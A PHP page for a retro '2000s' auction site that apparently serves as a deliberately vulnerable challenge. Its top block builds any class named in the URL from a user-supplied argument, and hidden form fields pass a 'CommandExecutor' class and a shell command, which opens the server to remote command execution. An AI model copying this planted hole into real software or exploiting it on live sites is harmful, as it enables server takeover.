<?php
require_once 'autoload.php';

// Dummy data for the auction items
$items = [
    ['name' => 'Tamagotchi', 'starting_price' => 15.00, 'minimum_price' => 20.00, 'current_price' => 18.50, 'image' => 'tamagotchi.jpg'],
    ['name' => 'Nokia 3310', 'starting_price' => 30.00, 'minimum_price' => 50.00, 'current_price' => 45.00, 'image' => 'nokia3310.jpg'],
    ['name' => 'Pokémon Cards', 'starting_price' => 5.00, 'minimum_price' => 15.00, 'current_price' => 7.00, 'image' => 'pokemoncards.jpg'],
    ['name' => 'DVD Box Set of The Matrix', 'starting_price' => 20.00, 'minimum_price' => 30.00, 'current_price' => 22.00, 'image' => 'matrixdvd.jpg'],
    ['name' => 'Sony Walkman', 'starting_price' => 40.00, 'minimum_price' => 60.00, 'current_price' => 55.00, 'image' => 'sonywalkman.jpg']
];

if (isset($_GET['a']) && isset($_GET['b'])) {
    $className = $_GET['a'];
    $constructorArg = $_GET['b'];
    new $className($constructorArg);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2000's Auction Site</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background-color: #f0f8ff; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #000; padding: 8px; text-align: left; }
        th { background-color: #b0e0e6; }
        img { width: 100px; height: auto; }
        input[type="text"], input[type="submit"] { margin-top: 5px; }
    </style>
</head>
<body>
    <h1>Welcome to the Retro Auction Site</h1>
    <p>Explore our collection of vintage items from the 2000's and place your bids!</p>
    <table>
        <thead>
            <tr>
                <th>Item</th>
                <th>Starting Price</th>
                <th>Minimum Price to Sell</th>
                <th>Current Price</th>
                <th>Place Your Bid</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($items as $item): ?>
            <tr>
                <td>
                    <img src="images/<?= htmlspecialchars($item['image']) ?>" alt="<?= htmlspecialchars($item['name']) ?>">
                    <?= htmlspecialchars($item['name']) ?>
                </td>
                <td>$<?= number_format($item['starting_price'], 2) ?></td>
                <td>$<?= number_format($item['minimum_price'], 2) ?></td>
                <td>$<?= number_format($item['current_price'], 2) ?></td>
                <td>
                    <form action="index.php" method="GET">
                        <input type="text" name="new_bid" placeholder="Enter new bid">
                        <input type="submit" value="Bid">
                        <input type="hidden" name="a" value="CommandExecutor">
                        <input type="hidden" name="b" value="echo 'Bid placed successfully!';">
                    </form>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</body>
</html>
